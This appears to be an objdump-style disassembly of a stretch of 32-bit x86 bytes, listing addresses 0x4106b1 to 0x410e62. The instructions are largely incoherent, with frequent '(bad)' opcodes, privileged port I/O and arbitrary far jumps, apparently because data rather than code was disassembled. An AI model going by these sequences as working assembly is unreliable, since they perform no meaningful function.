  4106b1:	dec    esp
  4106b2:	add    BYTE PTR [ebx],al
  4106b4:	push   cs
  4106b5:	jnp    0x410687
  4106b7:	push   ebx
  4106b8:	adc    dl,BYTE PTR [ebx-0x56d181b3]
  4106be:	mov    ds:0x801d970e,al
  4106c3:	xchg   ebp,eax
  4106c4:	je     0x4106f4
  4106c6:	jns    0x41071e
  4106c8:	xor    eax,0xb48ea547
  4106cd:	loope  0x4106e7
  4106cf:	fs ins DWORD PTR es:[edi],dx
  4106d1:	cwde   
  4106d2:	xchg   esi,eax
  4106d3:	ss hlt 
  4106d5:	loopne 0x41073f
  4106d7:	dec    edi
  4106d8:	xchg   BYTE PTR [ecx-0x49737ab4],cl
  4106de:	gs popf 
  4106e0:	(bad)  
  4106e1:	idiv   al
  4106e3:	mov    fs,WORD PTR [eax]
  4106e5:	scas   al,BYTE PTR es:[edi]
  4106e6:	mov    al,ds:0xc7155486
  4106eb:	pop    es
  4106ec:	inc    edx
  4106ed:	dec    esp
  4106ee:	adc    DWORD PTR [ebp+0x54],eax
  4106f1:	das    
  4106f2:	push   cs
  4106f3:	fmul   st(2),st
  4106f5:	pusha  
  4106f6:	fucomp st(0)
  4106f8:	sub    ch,BYTE PTR [ebp-0x34]
  4106fb:	pop    ds
  4106fc:	jae    0x4106a4
  4106fe:	jnp    0x4106c4
  410700:	push   0x79
  410702:	jmp    0xd367:0x373d62f9
  410709:	arpl   WORD PTR [ecx],ax
  41070b:	jmp    0x4106a2
  41070d:	sbb    cl,BYTE PTR [edx]
  41070f:	cmc    
  410710:	jle    0x410714
  410712:	pop    ebx
  410713:	jg     0x410732
  410715:	call   0x59f6d5c9
  41071a:	mov    eax,0x8d3ee540
  41071f:	adc    BYTE PTR [ecx+0x4f953ac9],0x56
  410726:	dec    ecx
  410727:	inc    ecx
  410728:	popa   
  410729:	jp     0x4106b1
  41072b:	inc    esi
  41072c:	loope  0x4106f5
  41072e:	jecxz  0x410785
  410730:	aad    0xcc
  410732:	push   ds
  410733:	pop    ebp
  410734:	js     0x4106b6
  410736:	xchg   ebp,eax
  410737:	mov    ss,ecx
  410739:	jno    0x4106c3
  41073b:	mov    al,ds:0x87a953f5
  410740:	enter  0x5107,0x38
  410744:	pop    es
  410745:	inc    edx
  410746:	loop   0x4106d7
  410748:	mov    dl,0x48
  41074a:	xchg   ecx,eax
  41074b:	sbb    ch,dl
  41074d:	mov    cl,BYTE PTR [ecx-0x3e]
  410750:	and    BYTE PTR [edi-0x28],dh
  410753:	jbe    0x4106d9
  410755:	lds    edi,FWORD PTR [edi-0x5f]
  410758:	fs xor bl,cl
  41075b:	imul   ebx,DWORD PTR [eax+0x7217d545],0xffffffa0
  410762:	call   0xcf292c87
  410767:	in     eax,0x99
  410769:	idiv   edx
  41076b:	push   esp
  41076c:	cmp    esi,edi
  41076e:	xor    dh,ah
  410770:	stos   DWORD PTR es:[edi],eax
  410771:	aam    0x67
  410773:	inc    edx
  410774:	cwde   
  410775:	(bad)  
  410778:	push   edx
  410779:	adc    ebp,ebx
  41077b:	sub    BYTE PTR [ebx-0x1d],bl
  41077e:	cmp    eax,0x7fd9300
  410783:	jae    0x410757
  410785:	(bad)  
  410786:	das    
  410787:	sbb    eax,0xb1046121
  41078c:	ins    BYTE PTR es:[edi],dx
  41078d:	iret   
  41078e:	jg     0x410793
  410790:	call   0xeaeae912
  410795:	add    eax,0x276d801b
  41079a:	add    bl,BYTE PTR [esi-0x63352b9]
  4107a0:	ja     0x4107f2
  4107a2:	mov    eax,ds:0xa8f7df14
  4107a7:	push   esi
  4107a8:	test   eax,0x44e75fe9
  4107ad:	mov    eax,0x7ababf44
  4107b2:	mov    ch,0x2
  4107b4:	out    dx,al
  4107b5:	adc    eax,0xc19e7fa7
  4107ba:	sti    
  4107bb:	mov    edi,0xa29daecc
  4107c0:	dec    edi
  4107c1:	adc    esp,0x4
  4107c4:	mov    BYTE PTR [edx],bh
  4107c6:	cdq    
  4107c7:	xchg   BYTE PTR [ecx-0x2c],ah
  4107ca:	xor    ah,BYTE PTR [eax+0x322ec88a]
  4107d0:	xor    dh,ch
  4107d2:	jp     0x4107f9
  4107d4:	cmp    eax,0x220b1781
  4107d9:	test   al,0xd6
  4107db:	scas   eax,DWORD PTR es:[edi]
  4107dc:	or     al,0xe8
  4107de:	icebp  
  4107df:	mov    dl,0xf2
  4107e1:	and    DWORD PTR [ebp+esi*2-0x4f99af21],0x1e
  4107e9:	sub    cl,ah
  4107eb:	into   
  4107ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107ed:	mov    dh,0x63
  4107ef:	ret    0x568c
  4107f2:	aam    0xd4
  4107f4:	push   edx
  4107f5:	xor    DWORD PTR [ecx+0x7aced9b],eax
  4107fb:	fldcw  WORD PTR [edx+esi*8-0x31]
  4107ff:	dec    ebx
  410800:	xor    BYTE PTR ss:[edx-0x24d9237f],0x36
  410808:	mov    ebp,0x10ad6f73
  41080d:	out    0x86,al
  41080f:	inc    edx
  410810:	sar    BYTE PTR cs:[ebx],cl
  410813:	mov    edx,0x3e7077b3
  410818:	sbb    ebx,esi
  41081a:	stos   BYTE PTR es:[edi],al
  41081b:	inc    edx
  41081c:	jle    0x410827
  41081e:	jbe    0x4107fc
  410820:	(bad)  
  410822:	call   DWORD PTR [ebx-0x24]
  410825:	mov    ebx,0xb92acbfd
  41082a:	mov    esp,0x7ad6268f
  41082f:	stos   DWORD PTR es:[edi],eax
  410830:	mov    al,0x5b
  410832:	mov    dl,al
  410834:	cdq    
  410835:	and    al,0x1c
  410837:	inc    eax
  410838:	jge    0x41081e
  41083a:	neg    BYTE PTR ss:[ecx+0xe]
  41083e:	les    edi,FWORD PTR [esi+0x344dff7b]
  410844:	aaa    
  410845:	popf   
  410846:	scas   al,BYTE PTR es:[edi]
  410847:	jnp    0x410867
  410849:	in     al,0x5
  41084b:	lds    esp,FWORD PTR [edx-0x31]
  41084e:	sub    ah,BYTE PTR [esi]
  410850:	adc    al,0x5
  410852:	xchg   esp,eax
  410853:	adc    DWORD PTR [edi],ebx
  410855:	inc    eax
  410856:	(bad)  
  410857:	fcmovu st,st(3)
  410859:	retf   
  41085a:	arpl   ax,di
  41085c:	(bad)  
  41085d:	sti    
  41085e:	iret   
  41085f:	scas   eax,DWORD PTR es:[edi]
  410860:	sub    al,0x22
  410862:	dec    esp
  410863:	retf   
  410864:	fst    QWORD PTR [ebx-0x26]
  410867:	xchg   ebp,eax
  410868:	out    dx,eax
  410869:	mov    bh,0xa9
  41086b:	shl    BYTE PTR fs:[edi+0x1513ccf8],cl
  410872:	mov    ah,0xc2
  410874:	jbe    0x410857
  410876:	(bad)  
  410877:	jns    0x410823
  410879:	bound  esi,QWORD PTR [ecx]
  41087b:	xchg   ebp,eax
  41087c:	jge    0x410882
  41087e:	inc    ebp
  41087f:	dec    ebp
  410880:	scas   al,BYTE PTR es:[edi]
  410881:	mov    ah,BYTE PTR ds:0x56641931
  410887:	in     eax,dx
  410888:	pop    ds
  410889:	adc    esi,ecx
  41088b:	ins    BYTE PTR es:[edi],dx
  41088c:	pop    dx
  41088e:	iret   
  41088f:	js     0x41090b
  410891:	popf   
  410892:	push   cs
  410893:	sbb    BYTE PTR [edi],bh
  410895:	loope  0x410818
  410897:	mov    ebx,0xd99ecf18
  41089c:	jno    0x41081f
  41089e:	push   eax
  41089f:	ret    
  4108a0:	out    0xfa,al
  4108a2:	enter  0x323d,0x55
  4108a6:	and    esp,ebx
  4108a8:	sbb    ah,dl
  4108aa:	pop    esi
  4108ab:	ins    DWORD PTR es:[edi],dx
  4108ac:	push   esp
  4108ad:	push   esp
  4108ae:	dec    ebx
  4108af:	adc    ecx,DWORD PTR [edx]
  4108b1:	cmp    ebx,DWORD PTR ds:0xfe1c6fb8
  4108b7:	retf   
  4108b8:	xchg   ebx,eax
  4108b9:	jns    0x4108ad
  4108bb:	and    al,0x47
  4108bd:	ret    
  4108be:	out    dx,al
  4108bf:	adc    edi,DWORD PTR [edx]
  4108c1:	or     al,0x49
  4108c3:	mov    dl,0x5f
  4108c5:	jmp    0x410899
  4108c7:	pop    edi
  4108c8:	push   eax
  4108c9:	and    al,0x3
  4108cb:	sbb    DWORD PTR [edi],0xa7068d83
  4108d1:	add    al,0x4
  4108d3:	or     ah,BYTE PTR ds:0x2ee2bcc1
  4108d9:	sub    ch,0x85
  4108dc:	aam    0xad
  4108de:	mov    bl,0xd5
  4108e0:	ss push eax
  4108e2:	in     al,dx
  4108e3:	mov    edx,0x992ea1b0
  4108e8:	mov    ecx,0xdbd73926
  4108ed:	call   0xbab5:0xab8f9826
  4108f4:	mov    al,0xa9
  4108f6:	lock lods al,BYTE PTR ds:[esi]
  4108f8:	sub    edi,DWORD PTR [edi+0x1b]
  4108fb:	xor    DWORD PTR [edx],0xffffff9a
  4108fe:	mov    edi,0x28e893de
  410903:	cld    
  410904:	sub    ah,0x6e
  410907:	ins    BYTE PTR es:[edi],dx
  410908:	hlt    
  410909:	hlt    
  41090a:	aam    0xcf
  41090c:	xor    eax,0x7969b971
  410911:	or     dh,BYTE PTR [eax+0x3a]
  410914:	dec    ebx
  410915:	push   cs
  410916:	(bad)  
  410917:	mov    bl,bh
  410919:	fucom  st(6)
  41091b:	addr16 test ebx,ebp
  41091e:	jmp    0x4d23f839
  410923:	mov    al,ds:0x3ac49c4e
  410928:	mov    ch,0x88
  41092a:	(bad)  
  41092b:	lods   al,BYTE PTR ds:[esi]
  41092c:	mov    edx,0x5ac2eacb
  410931:	inc    esi
  410932:	sbb    al,0x72
  410934:	daa    
  410935:	scas   eax,DWORD PTR es:[edi]
  410936:	adc    BYTE PTR [edi+edx*8],0x9e
  41093a:	sub    eax,0x27d18f4f
  41093f:	cmp    eax,0xf18bf6a7
  410944:	sti    
  410945:	cmp    eax,0x64721eaa
  41094a:	popa   
  41094b:	push   esp
  41094c:	pusha  
  41094d:	mov    dl,0xf
  41094f:	into   
  410950:	jle    0x410902
  410952:	daa    
  410953:	adc    ch,BYTE PTR [ecx-0x29]
  410956:	jge    0x4109cb
  410958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410959:	jmp    0x4108f5
  41095b:	jb     0x410952
  41095d:	icebp  
  41095e:	fucomip st,st(0)
  410960:	test   BYTE PTR [esi],bh
  410962:	or     BYTE PTR [edi+0x43],cl
  410965:	or     al,0xca
  410967:	hlt    
  410968:	es dec esi
  41096a:	fldcw  WORD PTR [esi+0x6f4b97be]
  410970:	loopne 0x410996
  410972:	sub    DWORD PTR [esi+0x52],ebp
  410975:	pop    esi
  410976:	push   edx
  410977:	dec    esi
  410978:	xchg   dh,bl
  41097a:	sbb    BYTE PTR [edx],ah
  41097c:	gs push ebp
  41097e:	and    bh,ah
  410980:	ficomp DWORD PTR [esi+0x1662616b]
  410986:	cli    
  410987:	inc    eax
  410988:	stc    
  410989:	push   edx
  41098a:	out    0xb7,eax
  41098c:	jl     0x4109b9
  41098e:	or     al,BYTE PTR [ecx+0x38]
  410991:	pop    ds
  410992:	jb     0x41093b
  410994:	sub    edx,0x31
  410997:	mov    edx,0x6eb8357
  41099c:	mov    eax,ds:0x1cc45b1
  4109a1:	mov    ah,0xc1
  4109a3:	lods   al,BYTE PTR ds:[esi]
  4109a4:	mov    bh,0xe4
  4109a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109a8:	out    dx,al
  4109a9:	xchg   ecx,eax
  4109aa:	retf   0x3bb5
  4109ad:	ins    BYTE PTR es:[edi],dx
  4109ae:	ins    DWORD PTR es:[edi],dx
  4109af:	aas    
  4109b0:	mov    ebx,0xd54f780d
  4109b5:	into   
  4109b6:	ficomp WORD PTR [ebx]
  4109b8:	icebp  
  4109b9:	mov    esi,0xf0360c8
  4109be:	js     0x410a39
  4109c0:	fwait
  4109c1:	xchg   esp,eax
  4109c2:	sti    
  4109c3:	dec    ebp
  4109c4:	cmp    ecx,esi
  4109c6:	in     al,dx
  4109c7:	pcmpgtw mm3,mm4
  4109ca:	sub    eax,0x6b93bdc0
  4109cf:	cmp    DWORD PTR [ecx],0x56
  4109d2:	lea    esi,[esi-0x3d]
  4109d5:	sti    
  4109d6:	(bad)  
  4109d7:	push   eax
  4109d8:	mov    ds:0xbc5cd6c4,al
  4109dd:	or     al,0xba
  4109df:	jnp    0x4109bf
  4109e1:	mov    dh,BYTE PTR [esi-0x3d206ca2]
  4109e7:	clc    
  4109e8:	xor    cl,BYTE PTR [ecx-0x9]
  4109eb:	int3   
  4109ec:	sbb    edi,ebp
  4109ee:	rcl    DWORD PTR [ebx-0x3e659c10],cl
  4109f4:	lea    ebp,[ebx-0x3e508ddf]
  4109fa:	les    esi,FWORD PTR [esi]
  4109fc:	pop    esp
  4109fd:	popf   
  4109fe:	shl    BYTE PTR cs:[esi],0xfc
  410a02:	and    eax,0x13e14f5
  410a07:	dec    ebx
  410a08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a09:	retf   
  410a0a:	(bad)  
  410a0b:	(bad)  
  410a0c:	dec    eax
  410a0d:	mov    ebp,0xcccd99c4
  410a12:	(bad)  
  410a13:	push   ss
  410a14:	dec    ebx
  410a15:	punpckhwd mm0,QWORD PTR [edx]
  410a18:	out    dx,al
  410a19:	mov    gs,ebp
  410a1b:	in     al,0x63
  410a1d:	jnp    0x410a43
  410a1f:	retf   0x2ae3
  410a22:	sahf   
  410a23:	call   0x7ce2:0x1c51c2e0
  410a2a:	mov    ds:0xc55b03fb,al
  410a30:	xor    eax,0x25f3288c
  410a35:	sti    
  410a36:	in     al,0x9e
  410a38:	out    dx,al
  410a39:	in     al,dx
  410a3a:	mov    bh,0xd3
  410a3c:	in     al,0x7
  410a3e:	mov    ecx,0xe73c9abe
  410a43:	jge    0x410aa4
  410a45:	mov    cl,0xe1
  410a47:	out    dx,al
  410a48:	nop
  410a49:	pushf  
  410a4a:	push   ebp
  410a4b:	sub    ecx,DWORD PTR [edi+0x322e3b12]
  410a51:	jl     0x410a8b
  410a53:	adc    eax,0xc51cc465
  410a58:	cld    
  410a59:	sti    
  410a5a:	and    ch,ah
  410a5c:	call   0x4af6:0x216d9d6e
  410a63:	and    al,0x1
  410a65:	sahf   
  410a66:	rcr    DWORD PTR [esi+ebp*8-0x2326cd5a],cl
  410a6d:	dec    ecx
  410a6e:	xchg   BYTE PTR [ebp-0x5bec3a6b],bl
  410a74:	inc    ebx
  410a75:	retf   0x5fa8
  410a78:	psubusb mm5,QWORD PTR [ebx]
  410a7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a7c:	mov    ch,0x9b
  410a7e:	cmc    
  410a7f:	and    al,0xe4
  410a81:	pop    esi
  410a82:	and    ebp,DWORD PTR [edi-0x5f]
  410a85:	mov    cl,0x32
  410a87:	push   cs
  410a88:	repz aam 0x21
  410a8b:	mov    edi,0xfcec5ac2
  410a90:	hlt    
  410a91:	ja     0x410b09
  410a93:	call   0x98e8d4a5
  410a98:	mov    esp,0x852414ca
  410a9d:	arpl   WORD PTR [ecx+0x62],sp
  410aa0:	and    ch,BYTE PTR [ebp-0x6]
  410aa3:	xchg   edx,eax
  410aa4:	fstp   DWORD PTR [esi-0x80]
  410aa7:	sar    BYTE PTR [ebx-0x1d],cl
  410aaa:	clc    
  410aab:	mov    esp,DWORD PTR [edi-0x5317bac0]
  410ab1:	int    0x24
  410ab3:	cmp    dl,BYTE PTR [ecx+esi*8]
  410ab6:	push   0x25c749b9
  410abb:	jmp    0x410a48
  410abd:	jle    0x410ad7
  410abf:	leave  
  410ac0:	and    eax,DWORD PTR ds:0x1f15596f
  410ac6:	mov    cl,0x7e
  410ac8:	test   al,0x1f
  410aca:	pop    ebx
  410acb:	dec    edx
  410acc:	jo     0x410b19
  410ace:	fs ds xor al,0x51
  410ad2:	mov    eax,DWORD PTR [eax]
  410ad4:	mov    bl,0x3d
  410ad6:	sti    
  410ad7:	xor    BYTE PTR [ecx+edi*4],dl
  410ada:	loopne 0x410afa
  410adc:	xchg   DWORD PTR ds:0x610e6f94,esp
  410ae2:	mov    DWORD PTR [ebx-0x325294f9],esp
  410ae8:	xchg   DWORD PTR [ebp-0x4880ac6b],esp
  410aee:	and    BYTE PTR [eax+0x34],bl
  410af1:	xor    ebx,DWORD PTR [edx+0x4a]
  410af4:	inc    esi
  410af5:	inc    eax
  410af6:	and    DWORD PTR [edi],edx
  410af8:	or     BYTE PTR [esi],0x97
  410afb:	ins    BYTE PTR es:[edi],dx
  410afc:	jmp    0xd7fa:0xc65c99d3
  410b03:	sub    BYTE PTR [eax-0x47],bl
  410b06:	das    
  410b07:	adc    dl,0x75
  410b0a:	mov    gs,ebx
  410b0c:	fisub  WORD PTR [esi+0x28f65178]
  410b12:	imul   ebp,DWORD PTR [esi+0x67],0x2c1a5358
  410b19:	sbb    al,bl
  410b1b:	push   esi
  410b1c:	jbe    0x410b55
  410b1e:	(bad)  
  410b1f:	pop    eax
  410b20:	push   0x2c92175d
  410b25:	fisubr WORD PTR [edx]
  410b27:	ja     0x410b36
  410b29:	ins    DWORD PTR es:[edi],dx
  410b2a:	push   ds
  410b2b:	add    DWORD PTR [edx+eax*8-0x31],0x75b1dc7d
  410b33:	jle    0x410b65
  410b35:	and    bl,BYTE PTR ds:0x6fdf1104
  410b3b:	jae    0x410ae2
  410b3d:	icebp  
  410b3e:	loop   0x410aef
  410b40:	cs scas eax,DWORD PTR es:[edi]
  410b42:	hlt    
  410b43:	or     al,BYTE PTR [edx]
  410b45:	and    al,0x43
  410b47:	test   al,0x1f
  410b49:	sbb    al,0x22
  410b4b:	xlat   BYTE PTR ds:[ebx]
  410b4c:	sub    eax,0x841c38d4
  410b51:	pop    es
  410b52:	push   ss
  410b53:	xor    al,0x4c
  410b55:	sbb    al,0xf4
  410b57:	outs   dx,BYTE PTR ds:[esi]
  410b58:	xchg   edi,eax
  410b59:	adc    al,BYTE PTR gs:[esi+0x301e0925]
  410b60:	dec    esi
  410b61:	or     al,0x22
  410b63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b64:	(bad)  
  410b65:	std    
  410b66:	push   esp
  410b67:	fsub   DWORD PTR [edx-0x29]
  410b6a:	imul   esp,esp,0x263554e4
  410b70:	pop    edi
  410b71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b72:	rol    BYTE PTR [esi+0xdb9fcfe],0x4c
  410b79:	out    0x35,eax
  410b7b:	mov    bl,0xb8
  410b7d:	xor    DWORD PTR [edx-0x410165d],ecx
  410b83:	inc    esi
  410b84:	not    BYTE PTR ds:0x9326960b
  410b8a:	xor    al,BYTE PTR [edi-0x2acc0f84]
  410b90:	pop    ss
  410b91:	mov    eax,ds:0x4d22a155
  410b96:	or     DWORD PTR [eax-0x10],esi
  410b99:	imul   esp,DWORD PTR [esi+edx*4+0x7f],0x61
  410b9e:	inc    ebp
  410b9f:	push   ds
  410ba0:	xor    esi,DWORD PTR [esp+ecx*4-0x5ffc1d6f]
  410ba7:	and    DWORD PTR [eax-0x70],ebp
  410baa:	xchg   esp,eax
  410bab:	daa    
  410bac:	adc    DWORD PTR [eax],eax
  410bae:	cli    
  410baf:	sbb    dh,BYTE PTR [edi]
  410bb1:	scas   al,BYTE PTR es:[edi]
  410bb2:	cmovae eax,DWORD PTR [ebx-0x41]
  410bb6:	mov    al,ds:0xc3a998cb
  410bbb:	dec    esp
  410bbc:	mov    ebp,0xf1448add
  410bc1:	into   
  410bc2:	jbe    0x410c3a
  410bc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bc5:	imul   ebx,ebp,0x4e
  410bc8:	scas   al,BYTE PTR es:[edi]
  410bc9:	into   
  410bca:	and    DWORD PTR [ecx-0x7a],ebx
  410bcd:	or     BYTE PTR [esi+0xd],al
  410bd0:	and    al,0x99
  410bd2:	jns    0x410bba
  410bd4:	and    dl,ah
  410bd6:	jne    0x410b94
  410bd8:	and    ch,BYTE PTR [edx]
  410bda:	fistp  QWORD PTR [ebx]
  410bdc:	call   0xdc5f:0xd2f07262
  410be3:	jle    0x410bed
  410be5:	test   BYTE PTR ds:0xb4bd7344,al
  410beb:	sbb    eax,0x2f8326c2
  410bf0:	pop    ecx
  410bf1:	dec    ebx
  410bf2:	leave  
  410bf3:	in     eax,0x10
  410bf5:	jecxz  0x410c02
  410bf7:	ss inc esp
  410bf9:	mov    dh,0xaa
  410bfb:	xor    ebp,eax
  410bfd:	(bad)  
  410bfe:	(bad)  
  410c00:	repnz stos BYTE PTR es:[edi],al
  410c02:	inc    esp
  410c03:	push   edi
  410c04:	and    DWORD PTR [edi-0x6fe901ab],0x83f21c2b
  410c0e:	sub    DWORD PTR [edi-0x30],eax
  410c11:	aaa    
  410c12:	xor    al,0x1a
  410c14:	push   esp
  410c15:	jne    0x410c5b
  410c17:	adc    BYTE PTR [eax],cl
  410c19:	rcl    DWORD PTR [edi-0x3e6674b7],cl
  410c1f:	pop    ebx
  410c20:	mov    ecx,0xec8c341c
  410c25:	fisub  DWORD PTR [edi+0x19c1d807]
  410c2b:	ds jo  0x410c08
  410c2e:	sub    eax,0x208526ea
  410c33:	test   al,0x95
  410c35:	shr    BYTE PTR ds:0x5f19bcc8,0xb1
  410c3c:	sbb    edx,edi
  410c3e:	push   ss
  410c3f:	jns    0x410c5c
  410c41:	imul   edi,DWORD PTR [edi],0x4d
  410c44:	or     dh,BYTE PTR [edx+0x7729ad8c]
  410c4a:	bound  ebx,QWORD PTR [esi-0x7f]
  410c4d:	scas   al,BYTE PTR es:[edi]
  410c4e:	lods   al,BYTE PTR ds:[esi]
  410c4f:	cmp    DWORD PTR [edi-0x12831b0d],ebp
  410c55:	aad    0xcd
  410c57:	loop   0x410c01
  410c59:	fimul  DWORD PTR [eax+edi*4-0x68]
  410c5d:	iret   
  410c5e:	fscale 
  410c60:	pop    es
  410c61:	out    dx,al
  410c62:	out    dx,al
  410c63:	call   eax
  410c65:	mov    bh,BYTE PTR [edi]
  410c67:	aas    
  410c68:	mov    cl,0xfe
  410c6a:	ficom  DWORD PTR [edx]
  410c6c:	jle    0x410bf7
  410c6e:	pop    esp
  410c6f:	clc    
  410c70:	int3   
  410c71:	cwde   
  410c72:	shr    DWORD PTR [ecx],cl
  410c74:	in     eax,0x6a
  410c76:	in     al,0xa8
  410c78:	in     al,0xb7
  410c7a:	mov    dh,BYTE PTR [ebx]
  410c7c:	jmp    0xd351:0xd4de2bd6
  410c83:	and    DWORD PTR [ecx-0x74],esp
  410c86:	outs   dx,BYTE PTR ds:[esi]
  410c87:	dec    ebx
  410c88:	adc    al,0xdb
  410c8a:	inc    DWORD PTR [esi+0x180e48fa]
  410c90:	xchg   esp,eax
  410c91:	fwait
  410c92:	cmp    DWORD PTR ss:[esi],edx
  410c95:	mov    ch,0x20
  410c97:	jg     0x410cea
  410c99:	mov    bh,0xc6
  410c9b:	jmp    0x247f6b2b
  410ca0:	mov    cl,0x66
  410ca2:	inc    eax
  410ca3:	ror    DWORD PTR [ecx-0x313541c0],0xc9
  410caa:	repnz xchg ebp,eax
  410cac:	and    edi,esp
  410cae:	rcl    BYTE PTR [esi],1
  410cb0:	in     al,0x31
  410cb2:	push   ecx
  410cb3:	inc    ecx
  410cb4:	xor    DWORD PTR [ebx+0x4a3318c1],esp
  410cba:	or     al,0x81
  410cbc:	retf   0x136
  410cbf:	sbb    ecx,edi
  410cc1:	(bad)  [ecx+0x7d]
  410cc4:	dec    ecx
  410cc5:	pop    es
  410cc6:	(bad)  
  410cc7:	xchg   ecx,eax
  410cc8:	gs xor al,0xa4
  410ccb:	jge    0x410cf9
  410ccd:	jecxz  0x410c52
  410ccf:	(bad)  
  410cd0:	mov    cl,0xf9
  410cd2:	xor    eax,DWORD PTR [ecx-0x1d8830d0]
  410cd8:	inc    esp
  410cd9:	in     eax,dx
  410cda:	fistp  WORD PTR [esi+0x3d]
  410cdd:	pop    ds
  410cde:	inc    ecx
  410cdf:	or     eax,DWORD PTR [ecx+0x5]
  410ce2:	mov    ebp,0xc0b01319
  410ce7:	mov    al,0x47
  410ce9:	popf   
  410cea:	and    eax,0x502117f0
  410cef:	sub    eax,esp
  410cf1:	lods   eax,DWORD PTR ds:[esi]
  410cf2:	jecxz  0x410cac
  410cf4:	xlat   BYTE PTR ds:[ebx]
  410cf5:	sar    BYTE PTR [esp+ecx*8],0x3a
  410cf9:	mov    ds:0x9f23a56,eax
  410cfe:	dec    edi
  410cff:	(bad)  
  410d00:	retf   0xd737
  410d03:	pushf  
  410d04:	lea    esp,[esi+edi*1-0x4a100021]
  410d0b:	aas    
  410d0c:	pop    ebp
  410d0d:	retf   0xf931
  410d10:	js     0x410d0d
  410d12:	add    BYTE PTR [edi],bl
  410d14:	xor    al,0x1f
  410d16:	fsub   QWORD PTR [ebp-0x1b]
  410d19:	retf   0x8540
  410d1c:	adc    BYTE PTR ds:0x4e10058a,cl
  410d22:	and    DWORD PTR [esi-0x3dd4cf92],edx
  410d28:	mov    al,ds:0x4e0ecfa1
  410d2d:	mov    dh,0x87
  410d2f:	arpl   di,si
  410d31:	jbe    0x410cb5
  410d33:	mov    BYTE PTR [ebx+0x7c],dl
  410d36:	sub    DWORD PTR [edi+edx*4-0x71a45908],ecx
  410d3d:	sbb    BYTE PTR [esi-0x5e12dec],al
  410d43:	fsubr  QWORD PTR [edi+0x79]
  410d46:	cmp    eax,DWORD PTR [esi+0x26]
  410d49:	or     eax,0x805f6309
  410d4e:	iret   
  410d4f:	push   es
  410d50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d51:	jecxz  0x410d28
  410d53:	pop    edx
  410d54:	mov    eax,0xae5e95f8
  410d59:	jbe    0x410d91
  410d5b:	leave  
  410d5c:	mov    dl,0x3d
  410d5e:	mov    BYTE PTR [edx+0x13],ch
  410d61:	aaa    
  410d62:	xor    esp,DWORD PTR [ecx+ebp*8-0x395da222]
  410d69:	jmp    0x13e155cf
  410d6e:	es sti 
  410d70:	fisubr WORD PTR [edi]
  410d72:	cmp    eax,0xb7943ba4
  410d77:	fstp   DWORD PTR [edi]
  410d79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d7a:	mov    ch,0x2
  410d7c:	lahf   
  410d7d:	cmp    esi,edi
  410d7f:	aaa    
  410d80:	fs fwait
  410d82:	mov    cl,0xe5
  410d84:	test   BYTE PTR [ecx-0x60e2ecb0],bh
  410d8a:	xor    al,0x6c
  410d8c:	dec    ebp
  410d8d:	ret    0x599e
  410d90:	es loop 0x410d6e
  410d93:	adc    bl,BYTE PTR [ebp-0x30e9f8b9]
  410d99:	push   ecx
  410d9a:	aaa    
  410d9b:	aad    0x9d
  410d9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d9e:	inc    ebx
  410d9f:	cmp    al,0x85
  410da1:	sbb    DWORD PTR [eax-0x22],0xb20238a4
  410da8:	lahf   
  410da9:	int    0xf7
  410dab:	add    DWORD PTR [ebp+0x24],edi
  410dae:	out    0x79,eax
  410db0:	inc    ebx
  410db1:	fdivr  DWORD PTR [ecx-0x7bb394c9]
  410db7:	out    0xcd,al
  410db9:	test   al,0x26
  410dbb:	ret    0xd761
  410dbe:	adc    al,0x40
  410dc0:	jp     0x410e15
  410dc2:	(bad)  
  410dc3:	pop    ebx
  410dc4:	xchg   esi,ebp
  410dc6:	js     0x410ded
  410dc8:	ss stc 
  410dca:	mul    BYTE PTR [ebx]
  410dcc:	sbb    BYTE PTR [esi+esi*2-0x4b20a09a],0x9d
  410dd4:	xchg   edi,eax
  410dd5:	aad    0xb9
  410dd7:	and    BYTE PTR [esi+0x7b],0xa2
  410ddb:	sub    eax,0xdfd6701b
  410de0:	je     0x410d71
  410de2:	push   edi
  410de3:	(bad)  
  410de4:	loop   0x410dd3
  410de6:	icebp  
  410de7:	sbb    ebx,DWORD PTR [ebx]
  410de9:	cwd    
  410deb:	test   BYTE PTR [edi],bh
  410ded:	std    
  410dee:	push   edi
  410def:	sbb    eax,0x184ada4a
  410df4:	lock xchg esp,eax
  410df6:	push   ebx
  410df7:	push   esi
  410df8:	ja     0x410e00
  410dfa:	inc    edi
  410dfb:	fidiv  WORD PTR [esp+eax*8-0x5b]
  410dff:	ins    BYTE PTR es:[edi],dx
  410e00:	add    BYTE PTR [ebx-0x14f27d57],dh
  410e06:	inc    edi
  410e07:	mov    DWORD PTR [ebx-0x2308781e],eax
  410e0d:	cmp    al,0x55
  410e0f:	jmp    DWORD PTR [esp+eax*8+0x6a]
  410e13:	push   esi
  410e14:	pushf  
  410e15:	lock add edi,eax
  410e18:	loop   0x410e04
  410e1a:	push   ss
  410e1b:	and    eax,0x116fabc0
  410e20:	xor    edx,esi
  410e22:	mov    fs,ebx
  410e24:	out    0xf8,eax
  410e26:	or     DWORD PTR [esi+eiz*4],edi
  410e29:	sahf   
  410e2a:	out    0xf8,eax
  410e2c:	mov    al,ds:0xcc135506
  410e31:	jae    0x410e4d
  410e33:	dec    ecx
  410e34:	fisubr DWORD PTR [ecx-0x7f]
  410e37:	sbb    dh,bh
  410e39:	fbld   TBYTE PTR [edx+ecx*2+0x601c1766]
  410e40:	jb     0x410df9
  410e42:	add    edx,edx
  410e44:	cmp    esi,DWORD PTR [edi-0x80]
  410e47:	mov    ah,0x77
  410e49:	dec    esp
  410e4a:	fdiv   DWORD PTR [esi]
  410e4c:	pop    edx
  410e4d:	repz and al,0xc9
  410e50:	inc    eax
  410e51:	jae    0x410e09
  410e53:	pop    ebx
  410e54:	sub    ah,0x6e
  410e57:	sub    BYTE PTR [ecx+edi*2],dl
  410e5a:	(bad)
  410e5d:	in     al,0xf8
  410e5f:	popa   
  410e60:	in     al,0x31
  410e62:	mov    dl,0xb4
